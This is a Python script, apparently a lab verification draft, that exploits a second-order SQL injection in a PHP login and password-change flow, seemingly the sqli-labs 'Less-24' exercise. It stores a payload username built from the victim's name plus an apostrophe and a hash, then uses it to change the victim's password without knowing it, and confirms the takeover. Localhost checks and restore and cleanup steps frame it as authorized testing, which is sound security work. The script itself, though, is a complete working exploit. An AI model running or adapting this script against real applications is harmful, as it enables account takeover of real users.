#!/usr/bin/env python3
# SQLI-005 second-order SQL injection verification draft. Authorized local lab only.
# Status: draft, NOT executed. Chain from supplied fragments A, B, C, D:
#   A: username -> mysql_escape_string -> INSERT users (payload stored as data)
#   B: login_user -> mysql_real_escape_string -> SELECT users -> $_SESSION['username'] = $row[1]
#   C: $username = $_SESSION['username'] -> UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
# Payload username = victim name + apostrophe + hash; the hash comments out the
# remaining password predicate, so the victim row is updated without its password.
import argparse
import http.cookiejar
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

LOCAL_HOSTS = ('localhost', '127.0.0.1', '::1')
APOS = chr(39)
HASH = chr(35)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Result(object):
    def __init__(self, status=None, headers=None, text='', error=None):
        self.status = status
        self.headers = headers or {}
        self.text = text or ''
        self.error = error

    def location(self):
        for key, value in self.headers.items():
            if key.lower() == 'location':
                return value
        return ''


def build_opener(jar):
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def http_post(opener, url, fields, timeout):
    body = urllib.parse.urlencode(fields).encode('ascii')
    req = urllib.request.Request(url, data=body, method='POST', headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml'})
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read()
            return Result(resp.status, dict(resp.headers), raw.decode('utf-8', 'replace'))
    except urllib.error.HTTPError as exc:
        raw = exc.read() if exc.fp else b''
        return Result(exc.code, dict(exc.headers or {}), raw.decode('utf-8', 'replace'))
    except urllib.error.URLError as exc:
        return Result(None, {}, '', 'CONNECTION-ERROR: ' + str(exc.reason))
    except Exception as exc:
        return Result(None, {}, '', 'PROTOCOL-ERROR: ' + str(exc))


def obs_register(res):
    if res.error:
        return res.error
    if 'Less-24-user-created' in res.text:
        return 'created'
    if 'username Already exists' in res.text:
        return 'exists'
    if 'Error Creating your user account' in res.text:
        return 'sql-error'
    return 'unrecognized status=' + str(res.status)


def has_auth_cookie(jar):
    for cookie in jar:
        if cookie.name == 'Auth':
            return True
    return False


def obs_login(res, jar):
    auth = has_auth_cookie(jar)
    if res.error:
        return res.error, auth
    if 'logged-in.php' in res.location():
        return 'success', auth
    if 'slap1.jpg' in res.text:
        return 'failure', auth
    if auth:
        return 'success-no-location-header', auth
    return 'unrecognized status=' + str(res.status), auth


def obs_change(res):
    if res.error:
        return res.error
    if 'Password successfully updated' in res.text:
        return 'updated'
    if 'failed.php' in res.location():
        return 'not-affected'
    if 'index.php' in res.location():
        return 'auth-redirect'
    if 'same value' in res.text:
        return 'password-mismatch'
    if 'You tried to be smart' in res.text:
        return 'sql-error'
    return 'unrecognized status=' + str(res.status)


def check_base(base, allow_remote):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('FATAL: base-url must be http or https')
    host = (parts.hostname or '').lower()
    if not allow_remote and host not in LOCAL_HOSTS:
        raise SystemExit('FATAL: only localhost, 127.0.0.1 or ::1 without --allow-remote')
    if not parts.path or parts.path == '/':
        raise SystemExit('FATAL: base-url must include the lab directory path')
    return base.rstrip('/')


def join(base, path):
    return base + '/' + path.lstrip('/')


def main():
    ap = argparse.ArgumentParser(description='SQLI-005 second-order SQLi local draft, not executed')
    ap.add_argument('--base-url', required=True)
    ap.add_argument('--register-path', default='new_user.php')
    ap.add_argument('--login-path', required=True)
    ap.add_argument('--passwd-path', required=True)
    ap.add_argument('--session-file', required=True)
    ap.add_argument('--victim-user', required=True)
    ap.add_argument('--victim-orig-pass', required=True)
    ap.add_argument('--victim-new-pass', required=True)
    ap.add_argument('--attacker-pass', required=True)
    ap.add_argument('--wrong-current-pass', default='wrong-current-pass-000')
    ap.add_argument('--timeout', type=float, default=10.0)
    ap.add_argument('--allow-remote', action='store_true')
    args = ap.parse_args()

    if args.victim_new_pass == args.victim_orig_pass:
        raise SystemExit('FATAL: victim-new-pass must differ from victim-orig-pass')

    base = check_base(args.base_url, args.allow_remote)
    reg_url = join(base, args.register_path)
    login_url = join(base, args.login_path)
    change_url = join(base, args.passwd_path)
    payload_user = args.victim_user + APOS + HASH
    print('payload username for the injected account: ' + payload_user)

    attacker_jar = http.cookiejar.LWPCookieJar(args.session_file)
    if os.path.exists(args.session_file):
        try:
            attacker_jar.load(ignore_discard=True, ignore_expires=True)
        except Exception:
            print('note: session file could not be loaded, starting a fresh cookie jar')
    attacker = build_opener(attacker_jar)
    setup = build_opener(http.cookiejar.CookieJar())

    # 1. register the victim test account (A fields: submit/username/password/re_password)
    res = http_post(setup, reg_url, {'submit': '1',
                                     'username': args.victim_user,
                                     'password': args.victim_orig_pass,
                                     're_password': args.victim_orig_pass}, args.timeout)
    state = obs_register(res)
    print('victim register: ' + state)
    if 'ERROR' in state or state == 'sql-error':
        print('STOP: environment failure while registering the test account')
        return 2
    if state == 'unrecognized status=404':
        print('STOP: register path not found, adapt --register-path')
        return 2
    if state not in ('created', 'exists'):
        print('STOP: victim row state is ambiguous, resolve before continuing')
        return 2

    # 2. baseline: victim logs in with the original password (normal hit row)
    victim_jar = http.cookiejar.CookieJar()
    res = http_post(build_opener(victim_jar), login_url,
                    {'login_user': args.victim_user,
                     'login_password': args.victim_orig_pass}, args.timeout)
    state, auth = obs_login(res, victim_jar)
    print('victim baseline login: ' + state + ' auth_cookie=' + str(auth))
    if not state.startswith('success'):
        print('STOP: baseline login failed, treat as auth/credential precondition failure')
        return 2

    # 3. register the injected login name as data (A)
    res = http_post(setup, reg_url, {'submit': '1',
                                     'username': payload_user,
                                     'password': args.attacker_pass,
                                     're_password': args.attacker_pass}, args.timeout)
    state = obs_register(res)
    print('attacker register: ' + state)
    if state == 'exists':
        print('STOP: payload row already exists, clean the two test rows before rerun')
        return 2
    if state != 'created':
        print('STOP: payload login name was not stored, do not continue')
        return 2

    # 4. payload account logs in; B copies the DB row value into SESSION username
    res = http_post(attacker, login_url, {'login_user': payload_user,
                                          'login_password': args.attacker_pass}, args.timeout)
    state, auth = obs_login(res, attacker_jar)
    print('attacker login: ' + state + ' auth_cookie=' + str(auth))
    if not state.startswith('success'):
        print('STOP: payload login failed, check the connection charset used by mysql_real_escape_string')
        return 2
    attacker_jar.save(args.session_file, ignore_discard=True, ignore_expires=True)

    # 5. change password while sending a deliberately wrong current password
    res = http_post(attacker, change_url, {'submit': '1',
                                           'current_password': args.wrong_current_pass,
                                           'password': args.victim_new_pass,
                                           're_password': args.victim_new_pass}, args.timeout)
    state = obs_change(res)
    print('attacker change-password: ' + state)
    if state == 'auth-redirect':
        print('STOP: change page redirected to index.php, Auth/session precondition failed')
        return 2
    if state != 'updated':
        print('STOP: no update business result parsed; observation insufficient, not evidence of filtering')
        return 3

    # 6. independent re-check: true-condition row (new password) and false row (old password)
    new_jar = http.cookiejar.CookieJar()
    res = http_post(build_opener(new_jar), login_url,
                    {'login_user': args.victim_user,
                     'login_password': args.victim_new_pass}, args.timeout)
    new_state, new_auth = obs_login(res, new_jar)
    old_jar = http.cookiejar.CookieJar()
    res = http_post(build_opener(old_jar), login_url,
                    {'login_user': args.victim_user,
                     'login_password': args.victim_orig_pass}, args.timeout)
    old_state, old_auth = obs_login(res, old_jar)
    print('victim login with new password: ' + new_state + ' auth_cookie=' + str(new_auth))
    print('victim login with old password: ' + old_state + ' auth_cookie=' + str(old_auth))
    took_over = new_state.startswith('success') and old_state == 'failure'

    # 7. restore the original password through the legitimate change flow
    restored = 'not-attempted'
    if new_state.startswith('success'):
        restore_jar = http.cookiejar.CookieJar()
        restore = build_opener(restore_jar)
        http_post(restore, login_url, {'login_user': args.victim_user,
                                       'login_password': args.victim_new_pass}, args.timeout)
        res = http_post(restore, change_url, {'submit': '1',
                                              'current_password': args.victim_new_pass,
                                              'password': args.victim_orig_pass,
                                              're_password': args.victim_orig_pass}, args.timeout)
        print('restore change-password: ' + obs_change(res))
        verify_jar = http.cookiejar.CookieJar()
        res = http_post(build_opener(verify_jar), login_url,
                        {'login_user': args.victim_user,
                         'login_password': args.victim_orig_pass}, args.timeout)
        restored, verify_auth = obs_login(res, verify_jar)
        print('restore verification login: ' + restored + ' auth_cookie=' + str(verify_auth))

    print('')
    print('RESULT takeover_observed=' + str(took_over) + ' victim_restore_login=' + restored)
    print('Cleanup (manual DB console, only after approval): delete exactly the two test rows')
    print('  victim username: ' + args.victim_user)
    print('  payload username: ' + payload_user)
    print('  do not enumerate or export any other row.')
    if took_over:
        print('Observation is consistent with the static candidate; capture evidence for workpackage 4.')
        return 0
    print('No consistent takeover observation: record observation insufficient, not evidence of safety.')
    return 3


if __name__ == '__main__':
    sys.exit(main())
